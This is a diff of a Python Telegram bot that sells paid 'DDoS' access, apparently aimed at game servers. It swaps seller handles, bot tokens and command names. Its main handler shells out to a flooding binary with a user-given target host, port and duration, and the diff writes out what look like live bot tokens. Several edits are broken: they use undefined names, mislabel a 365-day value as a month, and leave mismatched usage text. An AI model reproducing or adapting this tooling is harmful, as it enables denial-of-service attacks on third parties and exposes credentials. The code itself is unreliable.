@@ -7,8 +7,8 @@ import os
 
 from keep_alive import keep_alive
 keep_alive()
-# insert your Telegram bot token here
-bot = telebot.TeleBot('7121296986:AAFIM_aic1ebTnt56inV95-cwl4P308ZHNQ')
+# insert your Telegram bot token 
+bot = telebot.TeleBot('6770387119:AAFuhfIg8oX1ylOHFFEk-f6WkUbaeo7CaCk')
 
 # Admin user IDs
 admin_id = ["5951921135"]
@@ -75,7 +75,7 @@ def clear_logs():
 def record_command_logs(user_id, command, target=None, port=None, time=None):
     log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
     if target:
-        log_entry += f" | Target: {OVI}"
+        log_entry += f" | Target: {TATGET}"
     if port:
         log_entry += f" | Port: {port}"
     if time:
@@ -111,7 +111,7 @@ def set_approval_expiry_date(user_id, duration, time_unit):
     elif time_unit == "week" or time_unit == "weeks":
         expiry_date = current_time + datetime.timedelta(weeks=duration)
     elif time_unit == "month" or time_unit == "months":
-        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
+        expiry_date = current_time + datetime.timedelta(days=365 * duration)  # Approximation of a month
     else:
         return False
     
@@ -189,7 +189,7 @@ def remove_user(message):
             response = '''Please Specify A User ID to Remove. 
 ✅ Usage: /remove <userid>'''
     else:
-        response = "You have not purchased yet purchase now from:- @venomXcrazy 🙇."
+        response = "You have not purchased yet purchase now from:- @CHIRAGDDOS🙇."
 
     bot.reply_to(message, response)
 
@@ -208,7 +208,7 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ❌."
     else:
-        response = "You have not purchased yet purchase now from :- @venomXcrazy ❄."
+        response = "You have not purchased yet purchase now from :- @CHIRAGDDOS ❄."
     bot.reply_to(message, response)
 
 
@@ -252,7 +252,7 @@ def show_all_users(message):
         except FileNotFoundError:
             response = "No data found ❌"
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @venomXcrazy ❄."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @CHIRAGDDOS ❄."
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['logs'])
@@ -279,7 +279,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @CHIRAGDDOS"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- User of @CHIRAGDDOS"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -288,7 +288,7 @@ bgmi_cooldown = {}
 COOLDOWN_TIME =0
 
 # Handler for /bgmi command
-@bot.message_handler(commands=['bgmi'])
+@bot.message_handler(commands=['fuck'])
 def handle_bgmi(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
@@ -307,18 +307,18 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert port to integer
             time = int(command[3])  # Convert time to integer
-            if time > 600:
-                response = "Error: Time interval must be less than 600."
+            if time > 1200:
+                response = "Error: Time interval must be less than 1200."
             else:
                 record_command_logs(user_id, '/OVI', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(OVI, target, port, time)  # Call start_attack_reply function
-                full_command = f"./OVI {target} {port} {time} 100"
+                start_attack_reply(fuck, target, port, time)  # Call start_attack_reply function
+                full_command = f"./fuck {target} {port} {time} 100"
                 process = subprocess.run(full_command, shell=True)
                 response = f"OVI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
-            response = "✅ Usage :- /OVI <HOST> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /bgmi <HOST> <port> <duration>"  # Updated command syntax
     else:
         response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /bgmi command. DM TO BUY ACCESS:- @venomXcrazy")
 
@@ -370,11 +370,11 @@ Official Channel :- https://t.me/V3NOM_CH3AT
                 help_text += f"{handler.commands[0]}: {handler.doc}\n"
     bot.reply_to(message, help_text)
 
-@bot.message_handler(commands=['start'])
+@bot.message_handler(commands=['fuck'])
 def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
-🤖Try To Run This Command : /help 
+🤖Try To Run This Command : /fuck 
 ✅BUY :- @CHIRAGDDOS'''
     bot.reply_to(message, response)
 
